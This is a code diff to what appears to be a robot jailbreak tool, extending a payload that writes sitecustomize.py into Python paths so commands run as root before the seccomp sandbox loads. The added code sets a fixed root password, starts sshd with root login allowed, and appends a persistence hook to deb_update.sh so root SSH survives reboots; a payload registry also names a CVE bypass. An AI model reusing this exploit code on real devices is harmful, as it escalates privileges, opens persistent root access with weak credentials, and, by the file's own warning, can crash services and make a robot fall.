@@ -415,13 +415,15 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
 def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
     """Enable SSH via sitecustomize.py injection (firmware >= 1.1.14/15).
 
-    Technique discovered by thiago.
+    Technique discovered by thiago. Persistence via deb_update.sh hook
+    (from TheRoboverse/unipwn).
 
     py_script_execute_env calls Py_Initialize() before seccomp_load(), so
     sitecustomize.py runs with full syscall access as root. This payload
     writes sitecustomize.py to all Python lib paths via np.savetxt. On the
     next Py_Initialize() (reboot or any script trigger), os.system() starts
-    sshd before the sandbox is applied.
+    sshd before the sandbox is applied, then hooks deb_update.sh so SSH
+    persists across reboots.
 
     Use when bypass-ssh fails (crond not running on 1.1.14/15).
 
@@ -429,6 +431,7 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
       1st L1+Y: writes sitecustomize.py via np.savetxt (inside seccomp)
       2nd L1+Y: triggers Py_Initialize() which loads sitecustomize.py
                 before seccomp, starting sshd with full syscall access
+                and installing the deb_update.sh persistence hook
 
     WARNING: sitecustomize.py must be removed after SSH is up or ALL Python
     services crash on every boot (robot may fall). Cleanup via SSH:
@@ -436,7 +439,7 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
             /usr/lib/python3.11/sitecustomize.py \\
             /usr/local/lib/python3.8/dist-packages/sitecustomize.py
     """
-    chpasswd = f"echo 'root:{password}' | /usr/sbin/chpasswd"
+    chpasswd = f"echo root:{password} | /usr/sbin/chpasswd"
     sshd_cmd = (
         "/usr/sbin/sshd"
         " -o PermitRootLogin=yes"
@@ -446,7 +449,24 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
     sshd_setup = (
         "mkdir -p /run/sshd && chmod 755 /run/sshd && chown root:root /run/sshd"
     )
-    content = f'import os; os.system("{sshd_setup} && {chpasswd} && {sshd_cmd}")'
+    persist_lines = (
+        f"### UnLeash-Lite: SSH persist\\n"
+        f"echo root:{password} | /usr/sbin/chpasswd\\n"
+        f"systemctl enable ssh\\n"
+        f"service ssh start\\n"
+    )
+    content = (
+        'import os\n'
+        f'os.system("{sshd_setup} && {chpasswd} && {sshd_cmd}")\n'
+        f'_f = "/unitree/var/data/deb_update/deb_update.sh"\n'
+        f'_m = "### UnLeash-Lite: SSH persist"\n'
+        'try:\n'
+        '    _r = open(_f).read()\n'
+        'except Exception:\n'
+        '    _r = ""\n'
+        'if _m not in _r:\n'
+        f'    open(_f, "a").write("\\n{persist_lines}")\n'
+    )
 
     paths = [
         "/usr/lib/python3.8/sitecustomize.py",
@@ -468,7 +488,7 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
     return WebRTCPayload(
         name="init-ssh",
         description=(
-            f"SSH via sitecustomize.py injection, root password={password} "
+            f"SSH + persistence via sitecustomize.py injection, root password={password} "
             "(fw >= 1.1.14/15)"
         ),
         python_code=code,
@@ -544,7 +564,7 @@ PAYLOAD_REGISTRY = {
     "bypass-escalate": ("Two-press self-overwrite (CVE-2026-27509 bypass)", payload_bypass_escalate),
     "bypass-ssh": ("Enable SSH via cron (firmware >= 1.1.14)", payload_bypass_ssh),
     "init-ssh": (
-        "SSH via sitecustomize.py injection (fw >= 1.1.14/15, no crond)",
+        "SSH + persistence via sitecustomize.py injection (fw >= 1.1.14/15, no crond)",
         payload_sitecustomize_ssh,
     ),
 }
